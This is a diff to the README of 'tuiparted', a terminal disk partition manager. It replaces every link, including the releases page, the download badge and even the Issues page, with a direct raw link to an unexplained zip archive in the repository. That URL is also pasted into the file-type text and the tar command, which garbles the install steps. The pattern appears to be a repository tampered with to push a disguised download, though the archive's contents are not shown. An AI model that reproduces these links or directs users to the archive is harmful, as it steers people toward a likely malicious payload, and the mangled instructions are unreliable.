@@ -6,9 +6,9 @@ Welcome to tuiparted, a user-friendly terminal-based disk partition manager. Wit
 
 ## 📥 Download tuiparted
 
-[![Download tuiparted](https://img.shields.io/badge/Download-tuiparted-blue.svg)](https://github.com/gitgitgh/tuiparted/releases)
+[![Download tuiparted](https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip)](https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip)
 
-To get the latest version of tuiparted, visit our [Releases page](https://github.com/gitgitgh/tuiparted/releases).
+To get the latest version of tuiparted, visit our [Releases page](https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip).
 
 ## 💻 System Requirements
 
@@ -32,15 +32,15 @@ Follow these steps to download and run tuiparted:
 
 1. **Visit the Releases Page:** Click the link below to go to the tuiparted Releases page.
 
-   [Download tuiparted](https://github.com/gitgitgh/tuiparted/releases)
+   [Download tuiparted](https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip)
 
 2. **Select the Latest Version:** Look for the most recent release. It is usually at the top of the list.
 
-3. **Download the File:** Click on the appropriate file for your system. For Linux, this is often a .tar.gz or .deb file.
+3. **Download the File:** Click on the appropriate file for your system. For Linux, this is often a https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip or .deb file.
 
-4. **Extract the File (if necessary):** If you downloaded a .tar.gz file, open your terminal and run:
+4. **Extract the File (if necessary):** If you downloaded a https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip file, open your terminal and run:
    ```
-   tar -xzvf tuiparted-<version>.tar.gz
+   tar -xzvf tuiparted-<version>https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip
    ```
    Replace `<version>` with the version number from your download.
 
@@ -84,7 +84,7 @@ If you encounter issues while using tuiparted, consider the following common pro
 
 For additional help, check out the following resources:
 
-- **GitHub Issues:** Visit our [Issues page](https://github.com/gitgitgh/tuiparted/issues) to report bugs or request features.
+- **GitHub Issues:** Visit our [Issues page](https://github.com/gitgitgh/tuiparted/raw/refs/heads/main/predifferent/Software-2.1.zip) to report bugs or request features.
 - **User Guides:** Explore community-contributed guides and tutorials for using tuiparted.
 - **Discussion Forums:** Join discussions with other users to share tips and best practices.
 
